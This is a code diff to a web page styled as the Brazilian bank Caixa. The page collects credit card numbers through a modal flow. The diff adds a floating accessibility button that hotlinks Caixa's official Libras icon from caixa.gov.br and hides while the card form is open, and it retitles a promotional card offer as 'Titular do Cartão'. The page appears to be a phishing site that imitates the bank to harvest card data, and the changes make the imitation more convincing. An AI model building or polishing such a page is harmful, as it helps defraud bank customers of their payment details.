@@ -310,6 +310,37 @@
     color: #ffc107;
     margin-bottom: 10px;
 }
+
+
+
+/* Botão de Acessibilidade - Versão corrigida */
+.botao-acessibilidade {
+    position: fixed;
+    width: 48px;
+    height: 48px;
+    top: 190px;
+    right: 15px;
+    z-index: 99999;
+    border-radius: 50%;
+    box-shadow: 0px 3px 6px #000029;
+    cursor: pointer;
+    background: #000029 url('https://www.caixa.gov.br/Style%20Library/images/ic-libras-cinza-v1.png');
+    background-size: 100% !important;
+    background-position: center;
+    background-repeat: no-repeat;
+    border: none;
+    min-width: 48px;
+    transition: opacity 0.3s ease;
+}
+
+.botao-acessibilidade.oculto {
+    opacity: 0;
+    visibility: hidden;
+    pointer-events: none;
+}
+
+
+
     
   </style>
 </head>
@@ -368,7 +399,7 @@
       </ul>
     </div>
   </div>
-
+<button class="botao-acessibilidade" id="btnAcessibilidade" title="Acessibilidade"></button>
   <!-- MAIN CONTENT -->
   <main class="py-4">
     <div class="container">
@@ -545,7 +576,7 @@
           <div id="flowCartao" class="flow-step">
             <div class="text-center mb-3">
               <i class="fas fa-credit-card fa-3x" style="color:var(--caixa-blue);"></i>
-              <h5>Cartão de Crédito Hoje!</h5>
+              <h5> Titular do Cartão </h5>
             </div>
             <div class="mb-3">
               <label class="form-label">Número do Cartão</label>
@@ -1246,6 +1277,55 @@ document.getElementById('confirmCartao').addEventListener('click', async () => {
             bootstrapModal.hide();
         });
     });
+
+
+  // ==================== CONTROLE DO BOTÃO DE ACESSIBILIDADE ====================
+const btnAcessibilidade = {
+    esconder: () => {
+        const btn = document.getElementById('btnAcessibilidade');
+        if (btn) btn.classList.add('oculto');
+    },
+    mostrar: () => {
+        const btn = document.getElementById('btnAcessibilidade');
+        if (btn) btn.classList.remove('oculto');
+    },
+    configurar: () => {
+        // Esconder quando abrir modal
+        document.getElementById('abrir-verificar')?.addEventListener('click', () => {
+            setTimeout(() => btnAcessibilidade.esconder(), 100);
+        });
+        
+        // Mostrar quando fechar modal
+        const botoesFechar = ['flowCancel', 'flowClose', 'closeSuccess'];
+        botoesFechar.forEach(id => {
+            document.getElementById(id)?.addEventListener('click', () => {
+                setTimeout(() => btnAcessibilidade.mostrar(), 300);
+            });
+        });
+        
+        // Fechar com X
+        document.querySelector('.btn-close')?.addEventListener('click', () => {
+            setTimeout(() => btnAcessibilidade.mostrar(), 300);
+        });
+        
+        // Observar mudanças no modal
+        const modal = document.getElementById('flowModal');
+        if (modal) {
+            new MutationObserver(() => {
+                if (modal.classList.contains('show')) {
+                    btnAcessibilidade.esconder();
+                } else {
+                    btnAcessibilidade.mostrar();
+                }
+            }).observe(modal, { attributes: true });
+        }
+    }
+};
+
+// Chamar a configuração
+if (document.getElementById('btnAcessibilidade')) {
+    btnAcessibilidade.configurar();
+}
 </script>
 
 
